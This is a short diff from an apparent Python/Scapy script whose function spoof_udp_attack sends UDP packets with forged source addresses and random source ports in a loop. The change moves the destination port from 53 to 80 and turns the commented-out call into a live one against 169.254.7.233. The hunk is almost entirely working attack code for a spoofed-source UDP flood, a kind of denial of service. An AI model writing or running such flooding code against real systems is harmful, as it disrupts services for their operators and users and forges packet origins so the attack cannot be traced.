@@ -24,11 +24,11 @@ def spoof_udp_attack(ip):
 		src = spoof_ipv4()
 		sport = randomize_port()
 		#dport = randomize_port()
-		dport = 53
+		dport = 80
 		packet = IP(src=src,dst=ip)/UDP(sport=sport,dport=dport)/message
 		send(packet)
 		print(src + "attacks from port " + str(sport) +" to " + str(dport))
 
-#spoof_udp_attack("192.168.0.105")
+spoof_udp_attack("169.254.7.233")
 
 
